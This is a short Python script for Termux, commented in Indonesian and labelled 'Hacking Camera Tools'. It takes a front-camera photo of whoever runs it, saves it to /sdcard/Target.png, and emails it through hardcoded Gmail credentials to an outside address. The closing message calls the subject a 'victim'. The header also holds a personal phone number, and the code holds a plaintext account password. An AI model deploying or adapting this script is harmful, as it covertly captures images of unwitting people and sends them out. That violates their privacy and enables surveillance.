#Jangan Recode
#Usaha Sendiri Oke
#Jangan Pantang Menyerah
#Belajar Saja Dari Nol
#Jangan Hanya Mengharap Yang Instan Saja
#Sebelum Menggunakan Tools Ini Harap Ganti Email abdidavit123@gmail.com Dengan Email Anda Sendiri
#Agar Gambarnya Terkirim Ke Email Anda Bukan Ke Email Saya
#Jika Ingin Di Tambahkan Fitur Baru Silakan Tambahkan Code Sendiri
#Atau Bisa Menunggu Update Dari Saya
#Dan Untuk Update Bisa Check/Chat Nomor WhatsApp Saya : +62895606026148
#Script Ini Bisa Di Gunakan Di Semua Hp Yang Support Dengan Termux

import os, sys
os.system('pip install termcolor')
os.system('termux-setup-storage')
from termcolor import colored
print(colored('Meginstall Paket...','blue'))
os.system('apt install termux-api')
os.system('termux-tts-speak sedang menginstall paket,mohon tunggu sebentar')
print(colored('[Jika Ada Pop Up Ijinkan Saja]','yellow'))
os.system('termux-tts-speak Jika Ada Pop ap Ijinkan Saja')
os.system('pip install yagmail')

import yagmail
print(colored('Paket Berhasil Di Install','green'))
os.system('termux-tts-speak Paket Berhasil Di Install')
os.system('clear')

baner="""

   ____    _    __  __ _____ ____      _    
  / ___|  / \  |  \/  | ____|  _ \    / \   
 | |     / _ \ | |\/| |  _| | |_) |  / _ \  
 | |___ / ___ \| |  | | |___|  _ <  / ___ \ 
  \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\ 1.1
            (Hacking Camera Tools)

         •> Code By : MR.C1M1N
         •> Github  : https://github.com/MR.C1M1N
         •> Target  : Just User Termux
         •> Update  : Chat My Phone Numbers In WhatsApp : +62895606026148
         •> Note    : Before Using This Script Please Install Termux-Api In PlayStore"""

print(colored(baner,'magenta'))
C1M1N=yagmail.SMTP('kapurbarus890@gmail.com','kapur barus89089')
subject='Photo'
os.system('termux-camera-photo -c 1 /sdcard/Target.png')
body='/sdcard/Target.png'
C1M1N.send('abdidavit123@gmail.com',body,subject)
os.system('termux-tts-speak Gambar Sudah Di Ambil')
print('')
print(colored('===================================================================','yellow'))
print(colored('Silakan Cek Photo Korban Di Memori Internal Anda :)','green'))
print(colored('===================================================================','yellow'))
